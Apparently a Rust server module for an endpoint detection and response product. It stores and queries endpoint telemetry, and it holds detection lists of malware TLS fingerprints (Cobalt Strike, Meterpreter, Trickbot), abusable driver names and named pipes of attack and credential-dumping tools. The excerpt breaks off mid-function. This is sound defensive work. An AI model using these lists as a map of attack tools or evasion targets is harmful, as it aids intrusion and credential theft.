use axum::extract::{Path as AxumPath, Query, State};
use axum::response::IntoResponse;
use axum::Json;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, Mutex, OnceLock, RwLock};
use std::time::{Duration, Instant};

use crate::dashboard::AppState;
use crate::events::{Event, EventLog};

const MAX_STORED_BEHAVIORS: usize = 1000;
const MAX_STORED_FLOWS: usize = 3000;
const MAX_STORED_THREATS: usize = 500;
const MAX_STORED_EVENTS: usize = 2000;
const MAX_STORED_SYSTEM_REPORTS: usize = 200;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsSummary {
    pub ops_read: u64,
    pub ops_written: u64,
    pub ops_open: u64,
    pub bytes_read: u64,
    pub bytes_written: u64,
    pub entropy_read: f64,
    pub entropy_written: f64,
    pub files_renamed_count: usize,
    pub files_read_count: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehaviorTelemetryPayload {
    pub machine_id: String,
    pub timestamp: u64,
    pub pid: u32,
    pub gid: u64,
    pub process_name: String,
    pub exe_path: String,
    pub command_line: String,
    pub sha256: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub parent_pid: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub parent_name: Option<String>,
    pub detection: String,
    pub source: String,
    pub risk_score: f32,
    pub indicators: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ops_summary: Option<OpsSummary>,
    #[serde(default)]
    pub details: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredBehavior {
    pub id: u64,
    pub timestamp: u64,
    pub time_iso: String,
    pub machine_id: String,
    pub pid: u32,
    pub gid: u64,
    pub process_name: String,
    pub exe_path: String,
    pub command_line: String,
    pub sha256: String,
    pub parent_pid: Option<u32>,
    pub parent_name: Option<String>,
    pub detection: String,
    pub source: String,
    pub risk_score: f32,
    pub verdict: String,
    pub threat_name: Option<String>,
    pub indicators: Vec<String>,
    pub ops_summary: Option<OpsSummary>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkFlowRecord {
    pub timestamp: u64,
    pub pid: u32,
    pub process_name: String,
    pub src_ip: String,
    pub src_port: u16,
    pub dst_ip: String,
    pub dst_port: u16,
    pub protocol: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub hostname: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub dns_query: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub http_method: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ja3: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ja3s: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredFlow {
    pub id: u64,
    pub timestamp: u64,
    pub time_iso: String,
    pub machine_id: String,
    pub pid: u32,
    pub process_name: String,
    pub src_ip: String,
    pub src_port: u16,
    pub dst_ip: String,
    pub dst_port: u16,
    pub protocol: String,
    pub hostname: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub dns_query: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub http_method: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ja3: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ja3s: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkFlowBatch {
    pub machine_id: String,
    pub flows: Vec<NetworkFlowRecord>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatReport {
    pub sha256: String,
    pub file_name: String,
    pub original_path: String,
    pub detection: String,
    pub source: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    #[serde(default)]
    pub details: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredThreat {
    pub id: u64,
    pub timestamp: u64,
    pub time_iso: String,
    pub sha256: String,
    pub file_name: String,
    pub original_path: String,
    pub detection: String,
    pub source: String,
    pub pid: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EdrEventRecord {
    #[serde(default)]
    pub timestamp: u64,
    #[serde(default)]
    pub time_iso: String,
    #[serde(default)]
    pub event_type: String,
    #[serde(default)]
    pub pid: u32,
    #[serde(default)]
    pub process_name: String,
    #[serde(default)]
    pub exe_path: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub details: Option<String>,
    #[serde(default)]
    pub raw: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EdrEventBatch {
    #[serde(default)]
    pub machine_id: String,
    #[serde(default)]
    pub events: Vec<EdrEventRecord>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredEdrEvent {
    pub id: u64,
    pub timestamp: u64,
    pub time_iso: String,
    pub machine_id: String,
    pub event_type: String,
    pub pid: u32,
    pub process_name: String,
    pub exe_path: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub details: Option<String>,
    #[serde(default)]
    pub raw: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredSystemReport {
    pub id: u64,
    pub timestamp: u64,
    pub time_iso: String,
    pub machine_id: String,
    pub hostname: String,
    pub os_version: String,
    pub monitored_processes_count: usize,
    pub rootkit_findings_count: usize,
    pub payload: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct EdrStats {
    pub total_behaviors: u64,
    pub malicious_behaviors: u64,
    pub suspicious_behaviors: u64,
    pub clean_behaviors: u64,
    pub total_flows: u64,
    pub total_threats: u64,
    #[serde(default)]
    pub total_events: u64,
    #[serde(default)]
    pub total_sysops: u64,
    #[serde(default)]
    pub total_system_reports: u64,
}

#[derive(Default)]
struct EdrStoreInner {
    next_id: u64,
    behaviors: VecDeque<StoredBehavior>,
    flows: VecDeque<StoredFlow>,
    threats: VecDeque<StoredThreat>,
    events: VecDeque<StoredEdrEvent>,
    system_reports: VecDeque<StoredSystemReport>,
    stats: EdrStats,
}

/// The live telemetry: the newest records in memory (what the dashboard polls) and,
/// when opened with [`EdrTelemetryStore::open`], every record kept in SQLite
/// (`edr_db`), read back at start and asked for searches and filters.
pub struct EdrTelemetryStore {
    inner: RwLock<EdrStoreInner>,
    db: Option<crate::edr_db::EdrDb>,
}

impl Default for EdrTelemetryStore {
    fn default() -> Self {
        Self::new()
    }
}

impl EdrTelemetryStore {
    /// A store that keeps only the in-memory window (nothing survives a restart).
    pub fn new() -> Self {
        Self {
            inner: RwLock::new(EdrStoreInner::default()),
            db: None,
        }
    }

    /// A store backed by the SQLite history at `path`: the newest records and the
    /// totals are read back from it. When it cannot be opened the store runs in
    /// memory only, as before, and says so.
    pub fn open(path: &std::path::Path) -> Self {
        let db = match crate::edr_db::EdrDb::open(path) {
            Ok(db) => db,
            Err(e) => {
                eprintln!("[EDR] telemetry history {} unavailable ({e}); keeping it in memory only", path.display());
                return Self::new();
            }
        };
        let mut inner = EdrStoreInner::default();
        match db.stats() {
            Ok(stats) => inner.stats = stats,
            Err(e) => eprintln!("[EDR] could not count the telemetry history: {e}"),
        }
        match db.behaviors(MAX_STORED_BEHAVIORS, None, None) {
            Ok(rows) => inner.behaviors = rows.into(),
            Err(e) => eprintln!("[EDR] could not read stored behaviors: {e}"),
        }
        match db.flows(MAX_STORED_FLOWS, None) {
            Ok(rows) => inner.flows = rows.into(),
            Err(e) => eprintln!("[EDR] could not read stored flows: {e}"),
        }
        match db.threats(MAX_STORED_THREATS) {
            Ok(rows) => inner.threats = rows.into(),
            Err(e) => eprintln!("[EDR] could not read stored threats: {e}"),
        }
        match db.edr_events(MAX_STORED_EVENTS, None, None, false, None) {
            Ok(rows) => inner.events = rows.into(),
            Err(e) => eprintln!("[EDR] could not read stored EDR events: {e}"),
        }
        match db.system_reports(MAX_STORED_SYSTEM_REPORTS) {
            Ok(rows) => inner.system_reports = rows.into(),
            Err(e) => eprintln!("[EDR] could not read stored system reports: {e}"),
        }
        // A record that fails to reach the database takes its id from this counter;
        // keep it past the stored ones.
        inner.next_id = [
            inner.behaviors.front().map(|b| b.id),
            inner.flows.front().map(|f| f.id),
            inner.threats.front().map(|t| t.id),
            inner.events.front().map(|e| e.id),
            inner.system_reports.front().map(|r| r.id),
        ]
        .into_iter()
        .flatten()
        .max()
        .unwrap_or(0);
        Self {
            inner: RwLock::new(inner),
            db: Some(db),
        }
    }

    /// The record's id: its row id in the history, or the next in-memory id when
    /// there is no history (or the write failed; the record then stays live in memory).
    fn assign_id(g: &mut EdrStoreInner, written: Option<rusqlite::Result<u64>>, what: &str) -> u64 {
        match written {
            Some(Ok(id)) => {
                g.next_id = g.next_id.max(id);
                id
            }
            Some(Err(e)) => {
                eprintln!("[EDR] could not store {what} in the telemetry history: {e}");
                g.next_id += 1;
                g.next_id
            }
            None => {
                g.next_id += 1;
                g.next_id
            }
        }
    }

    pub fn add_behavior(&self, payload: BehaviorTelemetryPayload, verdict: String, threat_name: Option<String>) {
        if let Ok(mut g) = self.inner.write() {
            let time_iso = Utc::now().to_rfc3339();

            g.stats.total_behaviors += 1;
            match verdict.as_str() {
                "malicious" => g.stats.malicious_behaviors += 1,
                "suspicious" => g.stats.suspicious_behaviors += 1,
                _ => g.stats.clean_behaviors += 1,
            }

            let mut item = StoredBehavior {
                id: 0,
                timestamp: payload.timestamp,
                time_iso,
                machine_id: payload.machine_id,
                pid: payload.pid,
                gid: payload.gid,
                process_name: payload.process_name,
                exe_path: payload.exe_path,
                command_line: payload.command_line,
                sha256: payload.sha256,
                parent_pid: payload.parent_pid,
                parent_name: payload.parent_name,
                detection: payload.detection,
                source: payload.source,
                risk_score: payload.risk_score,
                verdict,
                threat_name,
                indicators: payload.indicators,
                ops_summary: payload.ops_summary,
            };

            let written = self.db.as_ref().map(|db| db.insert_behavior(&item));
            item.id = Self::assign_id(&mut g, written, "a behavior");
            g.behaviors.push_front(item);
            if g.behaviors.len() > MAX_STORED_BEHAVIORS {
                g.behaviors.pop_back();
            }
        }
    }

    pub fn add_flows(&self, machine_id: &str, flows: &[NetworkFlowRecord]) {
        if flows.is_empty() {
            return;
        }
        if let Ok(mut g) = self.inner.write() {
            let time_iso = Utc::now().to_rfc3339();
            let mut items: Vec<StoredFlow> = flows
                .iter()
                .map(|f| StoredFlow {
                    id: 0,
                    timestamp: f.timestamp,
                    time_iso: time_iso.clone(),
                    machine_id: machine_id.to_string(),
                    pid: f.pid,
                    process_name: f.process_name.clone(),
                    src_ip: f.src_ip.clone(),
                    src_port: f.src_port,
                    dst_ip: f.dst_ip.clone(),
                    dst_port: f.dst_port,
                    protocol: f.protocol.clone(),
                    hostname: f.hostname.clone(),
                    dns_query: f.dns_query.clone(),
                    url: f.url.clone(),
                    http_method: f.http_method.clone(),
                    ja3: f.ja3.clone(),
                    ja3s: f.ja3s.clone(),
                })
                .collect();
            let stored = match self.db.as_ref().map(|db| db.insert_flows(&mut items)) {
                Some(Ok(())) => true,
                Some(Err(e)) => {
                    eprintln!("[EDR] could not store {} flows in the telemetry history: {e}", items.len());
                    false
                }
                None => false,
            };
            for mut item in items {
                g.stats.total_flows += 1;
                if stored {
                    g.next_id = g.next_id.max(item.id);
                } else {
                    g.next_id += 1;
                    item.id = g.next_id;
                }
                g.flows.push_front(item);
                if g.flows.len() > MAX_STORED_FLOWS {
                    g.flows.pop_back();
                }
            }
        }
    }

    pub fn add_threat(&self, report: &ThreatReport) {
        if let Ok(mut g) = self.inner.write() {
            g.stats.total_threats += 1;
            let time_iso = Utc::now().to_rfc3339();
            let mut item = StoredThreat {
                id: 0,
                timestamp: Utc::now().timestamp() as u64,
                time_iso,
                sha256: report.sha256.clone(),
                file_name: report.file_name.clone(),
                original_path: report.original_path.clone(),
                detection: report.detection.clone(),
                source: report.source.clone(),
                pid: report.pid,
            };
            let written = self.db.as_ref().map(|db| db.insert_threat(&item));
            item.id = Self::assign_id(&mut g, written, "a threat report");
            g.threats.push_front(item);
            if g.threats.len() > MAX_STORED_THREATS {
                g.threats.pop_back();
            }
        }
    }

    pub fn get_stats(&self) -> EdrStats {
        self.inner.read().map(|g| g.stats.clone()).unwrap_or_default()
    }

    pub fn get_behaviors(&self, limit: usize, risk_filter: Option<&str>, q: Option<&str>) -> Vec<StoredBehavior> {
        let q_lower = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());
        let risk_lower = risk_filter.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty() && s != "all");

        // A filter or a search looks through the whole history; the newest records
        // alone are the in-memory window.
        let wants_history = q_lower.is_some() || risk_lower.is_some() || limit > MAX_STORED_BEHAVIORS;
        if let Some(db) = self.db.as_ref().filter(|_| wants_history) {
            match db.behaviors(limit, risk_lower.as_deref(), q_lower.as_deref()) {
                Ok(rows) => return rows,
                Err(e) => eprintln!("[EDR] behavior history query failed ({e}); answering from memory"),
            }
        }

        let guard = match self.inner.read() {
            Ok(g) => g,
            Err(_) => return Vec::new(),
        };

        guard
            .behaviors
            .iter()
            .filter(|b| {
                if let Some(ref r) = risk_lower {
                    if !b.verdict.eq_ignore_ascii_case(r) {
                        return false;
                    }
                }
                if let Some(ref search) = q_lower {
                    let matches = b.process_name.to_lowercase().contains(search)
                        || b.exe_path.to_lowercase().contains(search)
                        || b.command_line.to_lowercase().contains(search)
                        || b.detection.to_lowercase().contains(search)
                        || b.machine_id.to_lowercase().contains(search)
                        || b.pid.to_string().contains(search)
                        || b.sha256.to_lowercase().contains(search);
                    if !matches {
                        return false;
                    }
                }
                true
            })
            .take(limit)
            .cloned()
            .collect()
    }

    pub fn get_flows(&self, limit: usize, q: Option<&str>) -> Vec<StoredFlow> {
        let q_lower = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());

        if let Some(db) = self.db.as_ref().filter(|_| q_lower.is_some() || limit > MAX_STORED_FLOWS) {
            match db.flows(limit, q_lower.as_deref()) {
                Ok(rows) => return rows,
                Err(e) => eprintln!("[EDR] flow history query failed ({e}); answering from memory"),
            }
        }

        let guard = match self.inner.read() {
            Ok(g) => g,
            Err(_) => return Vec::new(),
        };

        guard
            .flows
            .iter()
            .filter(|f| {
                if let Some(ref search) = q_lower {
                    let matches = f.process_name.to_lowercase().contains(search)
                        || f.src_ip.contains(search)
                        || f.dst_ip.contains(search)
                        || f.protocol.to_lowercase().contains(search)
                        || f.machine_id.to_lowercase().contains(search)
                        || f.hostname.as_deref().map_or(false, |h| h.to_lowercase().contains(search))
                        || f.dns_query.as_deref().map_or(false, |d| d.to_lowercase().contains(search))
                        || f.url.as_deref().map_or(false, |u| u.to_lowercase().contains(search))
                        || f.http_method.as_deref().map_or(false, |m| m.to_lowercase().contains(search))
                        || f.ja3.as_deref().map_or(false, |j| j.to_lowercase().contains(search))
                        || f.ja3s.as_deref().map_or(false, |j| j.to_lowercase().contains(search))
                        || f.pid.to_string().contains(search);
                    if !matches {
                        return false;
                    }
                }
                true
            })
            .take(limit)
            .cloned()
            .collect()
    }

    pub fn get_threats(&self, limit: usize) -> Vec<StoredThreat> {
        if let Some(db) = self.db.as_ref().filter(|_| limit > MAX_STORED_THREATS) {
            match db.threats(limit) {
                Ok(rows) => return rows,
                Err(e) => eprintln!("[EDR] threat history query failed ({e}); answering from memory"),
            }
        }
        let guard = match self.inner.read() {
            Ok(g) => g,
            Err(_) => return Vec::new(),
        };
        guard.threats.iter().take(limit).cloned().collect()
    }

    /// Stores lossless raw EDR / SysOps events into SQLite (no dedupe, no pruning)
    /// and updates the rolling live memory window.
    pub fn add_edr_events(&self, machine_id: &str, records: &[EdrEventRecord]) -> usize {
        if records.is_empty() {
            return 0;
        }
        let machine: String = machine_id.chars().take(128).collect();
        let now_dt = Utc::now();
        let now_iso = now_dt.to_rfc3339();
        let now_ts = now_dt.timestamp().max(0) as u64;

        let mut items: Vec<StoredEdrEvent> = records
            .iter()
            .filter(|r| !r.event_type.trim().is_empty())
            .map(|r| {
                let proc_name = if r.process_name.is_empty() && !r.exe_path.is_empty() {
                    r.exe_path
                        .rsplit(['\\', '/'])
                        .next()
                        .unwrap_or("")
                        .to_string()
                } else {
                    r.process_name.clone()
                };
                StoredEdrEvent {
                    id: 0,
                    timestamp: if r.timestamp == 0 { now_ts } else { r.timestamp },
                    time_iso: if r.time_iso.is_empty() {
                        now_iso.clone()
                    } else {
                        r.time_iso.clone()
                    },
                    machine_id: machine.clone(),
                    event_type: r.event_type.clone(),
                    pid: r.pid,
                    process_name: proc_name,
                    exe_path: r.exe_path.clone(),
                    details: r.details.clone(),
                    raw: r.raw.clone(),
                }
            })
            .collect();
        let count = items.len();
        if count == 0 {
            return 0;
        }

        if let Ok(mut g) = self.inner.write() {
            let stored = match self.db.as_ref().map(|db| db.insert_edr_events(&mut items)) {
                Some(Ok(())) => true,
                Some(Err(e)) => {
                    eprintln!("[EDR] could not store {count} EDR events in SQLite: {e}");
                    false
                }
                None => false,
            };
            let skip_mem = items.len().saturating_sub(MAX_STORED_EVENTS);
            for (idx, mut item) in items.into_iter().enumerate() {
                g.stats.total_events += 1;
                if item.event_type.starts_with("AGENT_") {
                    g.stats.total_sysops += 1;
                }
                if stored {
                    g.next_id = g.next_id.max(item.id);
                } else {
                    g.next_id += 1;
                    item.id = g.next_id;
                }
                if idx >= skip_mem {
                    g.events.push_front(item);
                    if g.events.len() > MAX_STORED_EVENTS {
                        g.events.pop_back();
                    }
                }
            }
        }
        count
    }

    pub fn get_edr_events(
        &self,
        limit: usize,
        event_type: Option<&str>,
        machine_id: Option<&str>,
        sysops_only: bool,
        q: Option<&str>,
    ) -> Vec<StoredEdrEvent> {
        let et_clean = event_type.map(str::trim).filter(|s| !s.is_empty());
        let mach_clean = machine_id.map(str::trim).filter(|s| !s.is_empty());
        let q_lower = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());

        let wants_history = et_clean.is_some()
            || mach_clean.is_some()
            || sysops_only
            || q_lower.is_some()
            || limit > MAX_STORED_EVENTS;
        if let Some(db) = self.db.as_ref().filter(|_| wants_history) {
            match db.edr_events(limit, et_clean, mach_clean, sysops_only, q_lower.as_deref()) {
                Ok(rows) => return rows,
                Err(e) => eprintln!("[EDR] EDR event history query failed ({e}); answering from memory"),
            }
        }

        let guard = match self.inner.read() {
            Ok(g) => g,
            Err(_) => return Vec::new(),
        };
        guard
            .events
            .iter()
            .filter(|ev| {
                if let Some(et) = et_clean {
                    let matched = et
                        .split(',')
                        .map(str::trim)
                        .filter(|s| !s.is_empty())
                        .any(|want| ev.event_type.eq_ignore_ascii_case(want));
                    if !matched {
                        return false;
                    }
                } else if sysops_only && !ev.event_type.starts_with("AGENT_") {
                    return false;
                }
                if let Some(m) = mach_clean {
                    if ev.machine_id != m {
                        return false;
                    }
                }
                if let Some(ref search) = q_lower {
                    let matches = ev.event_type.to_lowercase().contains(search)
                        || ev.process_name.to_lowercase().contains(search)
                        || ev.exe_path.to_lowercase().contains(search)
                        || ev.machine_id.to_lowercase().contains(search)
                        || ev.pid.to_string().contains(search)
                        || ev.details.as_deref().map_or(false, |d| d.to_lowercase().contains(search))
                        || ev.raw.to_string().to_lowercase().contains(search);
                    if !matches {
                        return false;
                    }
                }
                true
            })
            .take(limit)
            .cloned()
            .collect()
    }

    pub fn export_edr_events(
        &self,
        event_type: Option<&str>,
        machine_id: Option<&str>,
    ) -> Result<(Vec<u8>, u64), String> {
        let et_clean = event_type.map(str::trim).filter(|s| !s.is_empty());
        let mach_clean = machine_id.map(str::trim).filter(|s| !s.is_empty());
        if let Some(db) = self.db.as_ref() {
            let mut out = Vec::new();
            let n = db
                .export_edr_events(et_clean, mach_clean, &mut out)
                .map_err(|e| e.to_string())?;
            return Ok((out, n));
        }
        let guard = self.inner.read().map_err(|_| "store lock poisoned".to_string())?;
        let mut out = Vec::new();
        let mut n = 0u64;
        for ev in guard.events.iter().rev() {
            if et_clean.is_some_and(|et| !ev.event_type.eq_ignore_ascii_case(et)) {
                continue;
            }
            if mach_clean.is_some_and(|m| ev.machine_id != m) {
                continue;
            }
            if serde_json::to_writer(&mut out, ev).is_ok() {
                out.push(b'\n');
                n += 1;
            }
        }
        Ok((out, n))
    }

    pub fn add_system_report(&self, payload: &serde_json::Value) -> StoredSystemReport {
        let now_dt = Utc::now();
        let machine_id = payload
            .get("machine_id")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .chars()
            .take(128)
            .collect::<String>();
        let time_iso = payload
            .get("timestamp")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .unwrap_or_else(|| now_dt.to_rfc3339());
        let mut item = StoredSystemReport {
            id: 0,
            timestamp: now_dt.timestamp().max(0) as u64,
            time_iso,
            machine_id,
            hostname: payload
                .get("hostname")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            os_version: payload
                .get("os_version")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            monitored_processes_count: payload
                .get("monitored_processes_count")
                .and_then(|v| v.as_u64())
                .unwrap_or(0) as usize,
            rootkit_findings_count: payload
                .get("rootkit_findings_count")
                .and_then(|v| v.as_u64())
                .unwrap_or(0) as usize,
            payload: payload.clone(),
        };
        if let Ok(mut g) = self.inner.write() {
            let written = self.db.as_ref().map(|db| db.insert_system_report(&item));
            item.id = Self::assign_id(&mut g, written, "a system report");
            g.stats.total_system_reports += 1;
            g.system_reports.push_front(item.clone());
            if g.system_reports.len() > MAX_STORED_SYSTEM_REPORTS {
                g.system_reports.pop_back();
            }
        }
        item
    }

    pub fn get_system_reports(&self, limit: usize) -> Vec<StoredSystemReport> {
        if let Some(db) = self.db.as_ref().filter(|_| limit > MAX_STORED_SYSTEM_REPORTS) {
            match db.system_reports(limit) {
                Ok(rows) => return rows,
                Err(e) => eprintln!("[EDR] system report history query failed ({e}); answering from memory"),
            }
        }
        let guard = match self.inner.read() {
            Ok(g) => g,
            Err(_) => return Vec::new(),
        };
        guard.system_reports.iter().take(limit).cloned().collect()
    }
}

#[derive(Debug, Deserialize)]
pub struct TelemetryQuery {
    pub limit: Option<usize>,
    pub risk: Option<String>,
    pub q: Option<String>,
}

/// Handler for POST /api/v1/edr/telemetry/behavior
pub async fn handle_edr_telemetry_behavior(
    State(app): State<Arc<AppState>>,
    Json(payload): Json<BehaviorTelemetryPayload>,
) -> impl IntoResponse {
    Json(ingest_behavior(&app.edr_telemetry, &app.events, payload))
}

/// Records one behavior record (EDR store + live feed) and returns the verdict
/// the client acts on. Shared by the dashboard and the public API routes.
/// Sources whose detection name is the title of a matched rule with a severity
/// of its own, carried in `risk_score` (Sigma level: critical 1.0, high 0.85,
/// medium 0.6, anything lower 0.3). For every other source a detection name is
/// a verdict the agent already acted on.
const GRADED_DETECTION_SOURCES: &[&str] = &[
    "sigma_event_log",
    "edr_telemetry_rule",
    "server_telemetry_rule",
];

const SERVER_ALERT_DEDUP_TTL: Duration = Duration::from_secs(60);
const SERVER_ALERT_DEDUP_CAP: usize = 8192;

static SERVER_ALERT_DEDUP: OnceLock<Mutex<HashMap<(String, String, u32, String), Instant>>> =
    OnceLock::new();

const SERVER_MALICIOUS_TLS_FINGERPRINTS: &[(&str, &str)] = &[
    ("eb88d0b3e1961a0562f006e5ce2a0b87", "CobaltStrike.MalleableC2"),
    ("ae4edc6faf64d08308082ad26be60767", "CobaltStrike.Server.JA3S"),
    ("aa29d305dff6e6ac9cd244a62c6ad0c2", "CobaltStrike.Server.JA3S"),
    ("8916410db85077a5460817142dcbc8de", "Metasploit.Meterpreter"),
    ("72a589da586844d7f0818ce684948eea", "Metasploit.Meterpreter"),
    ("e564ee1b7bcae4467d8c759df910ed9c", "DeimosC2.Agent"),
    ("f4febc55ea12b31ae17cfb7e614afda8", "DeimosC2.Agent"),
    ("f6dfdd25d1522e4e1c7cd09bd37ce619", "RustyBuer.Server.JA3S"),
    ("16f17c896273d1d098314a02e87dd4cb", "Metasploit.HttpScanner"),
    ("950ccdd64d360a7b24c70678ac116a44", "Metasploit.CcsScanner"),
    ("ee031b874122d97ab269e0d8740be31a", "Metasploit.HeartbleedScanner"),
    ("6825b330bf9de50ccc8745553cb61b2f", "Metasploit.SslScanner"),
    ("1aa7bf8b97e540ca5edd75f7b8384bfa", "AbuseCh.Trickbot"),
    ("e62a5f4d538cbf169c2af71bec2399b4", "AbuseCh.Trickbot"),
    ("fb00055a1196aeea8d1bc609885ba953", "AbuseCh.Trickbot"),
    ("c50f6a8b9173676b47ba6085bd0c6cee", "AbuseCh.Trickbot"),
    ("3cda52da4ade09f1f781ad2e82dcfa20", "AbuseCh.QakBot"),
    ("7dd50e112cd23734a310b90f6f44a7cd", "AbuseCh.QakBot"),
    ("51c64c77e60f3980eea90869b68c58a8", "AbuseCh.Dridex"),
    ("cb98a24ee4b9134448ffb5714fd870ac", "AbuseCh.Dridex"),
    ("b386946a5a44d1ddcc843bc75336dfce", "AbuseCh.Dridex"),
    ("d6f04b5a910115f4b50ecec09d40a1df", "AbuseCh.Dridex"),
    ("57f3642b4e37e28f5cbe3020c9331b4c", "AbuseCh.Gozi"),
    ("c201b92f8b483fa388be174d6689f534", "AbuseCh.Gozi"),
    ("1be3ecebe5aa9d3654e6e703d81f6928", "AbuseCh.Troldesh"),
    ("1712287800ac91b34cadd5884ce85568", "AbuseCh.TorrentLocker"),
    ("c5235d3a8b9934b7fbbd204d50bc058d", "AbuseCh.Gootkit"),
    ("decfb48a53789ebe081b88aabb58ee34", "AbuseCh.Adwind"),
];

const SERVER_BYOVD_DRIVERS: &[&str] = &[
    "iqvw64e.sys",
    "rtcore64.sys",
    "rtcore32.sys",
    "dbutil_2_3.sys",
    "dbutildrv2.sys",
    "procexp152.sys",
    "gdrv.sys",
    "aswarpot.sys",
    "mhyprot2.sys",
    "zam64.sys",
    "zamguard64.sys",
    "truesight.sys",
    "bs_def64.sys",
    "capcom.sys",
    "speedfan.sys",
    "winring0x64.sys",
    "winring0.sys",
    "phymemx64.sys",
    "kprocesshacker.sys",
    "processhacker.sys",
    "ene.sys",
    "atszio64.sys",
    "glckio2.sys",
    "msio64.sys",
    "asio64.sys",
    "viragt64.sys",
    "echo_driver.sys",
    "k7rkscan.sys",
];

const SERVER_SECURITY_DRIVERS: &[&str] = &[
    "edrdrv.sys",
    "wdfilter.sys",
    "sysmondrv.sys",
    "windivert",
    "sanctum.sys",
    "sanctum_elam.sys",
    "mbrfilter.sys",
    "hyperhv.sys",
    "reddbgdrv.sys",
];

const SERVER_MALICIOUS_PIPES: &[&str] = &[
    "\\msagent_",
    "\\postex_",
    "\\psexesvc",
    "\\remcom_",
    "\\paexec_",
    "\\csexecsvc",
    "\\meterpreter",
    "\\gruntsvc",
    "\\sliver_",
    "\\lsadump",
    "\\cachedump",
    "\\wceservicepipe",
    "\\ahexec",
    "\\badpotato",
    "\\godpotato",
    "\\juicypotato",
    "\\sweetpotato",
    "\\efspotato",
    "\\printspoofer",
];

fn lookup_server_malicious_tls(hash: &str) -> Option<&'static str> {
    let trimmed = hash.trim();
    if trimmed.len() != 32 {
        return None;
    }
    SERVER_MALICIOUS_TLS_FINGERPRINTS
        .iter()
        .find(|(fp, _)| fp.eq_ignore_ascii_case(trimmed))
        .map(|(_, label)| *label)
}

fn should_emit_server_alert(machine_id: &str, rule_name: &str, pid: u32, subject: &str) -> bool {
    let hub = SERVER_ALERT_DEDUP.get_or_init(|| Mutex::new(HashMap::new()));
    let Ok(mut map) = hub.lock() else {
        return true;
    };
    let now = Instant::now();
    if map.len() >= SERVER_ALERT_DEDUP_CAP {
        map.retain(|_, ts| now.duration_since(*ts) < SERVER_ALERT_DEDUP_TTL);
        if map.len() >= SERVER_ALERT_DEDUP_CAP {
            map.clear();
        }
    }
    let key = (
        machine_id.to_string(),
        rule_name.to_string(),
        pid,
        subject.to_ascii_lowercase(),
    );
    if let Some(prev) = map.get(&key) {
        if now.duration_since(*prev) < SERVER_ALERT_DEDUP_TTL {
            return false;
        }
    }
    map.insert(key, now);
    true
}

fn emit_server_rule_alert(
    store: &EdrTelemetryStore,
    events: &EventLog,
    machine_id: &str,
    pid: u32,
    process_name: &str,
    exe_path: &str,
    sha256: &str,
    subject: &str,
    rule_name: &str,
    risk_score: f32,
    indicators: Vec<String>,
    command_line: String,
    details: serde_json::Value,
) {
    if !should_emit_server_alert(machine_id, rule_name, pid, subject) {
        return;
    }
    let payload = BehaviorTelemetryPayload {
        machine_id: machine_id.to_string(),
        timestamp: Utc::now().timestamp().max(0) as u64,
        pid,
        gid: pid as u64,
        process_name: if process_name.is_empty() {
            "unknown".to_string()
        } else {
            process_name.to_string()
        },
        exe_path: exe_path.to_string(),
        command_line,
        sha256: sha256.to_string(),
        parent_pid: None,
        parent_name: None,
        detection: rule_name.to_string(),
        source: "server_telemetry_rule".to_string(),
        risk_score,
        indicators,
        ops_summary: None,
        details,
    };
    let _ = ingest_behavior(store, events, payload);
}

fn raw_first_str<'a>(raw: &'a serde_json::Value, pointers: &[&str]) -> &'a str {
    for ptr in pointers {
        if let Some(s) = raw.pointer(ptr).and_then(|v| v.as_str()) {
            let t = s.trim();
            if !t.is_empty() && t != "<undefined>" && t != "null" {
                return t;
            }
        }
    }
    ""
}

fn raw_first_u64(raw: &serde_json::Value, pointers: &[&str]) -> Option<u64> {
    for ptr in pointers {
        if let Some(v) = raw.pointer(ptr) {
            if let Some(n) = v.as_u64() {
                return Some(n);
            }
            if let Some(s) = v.as_str() {
                let t = s.trim();
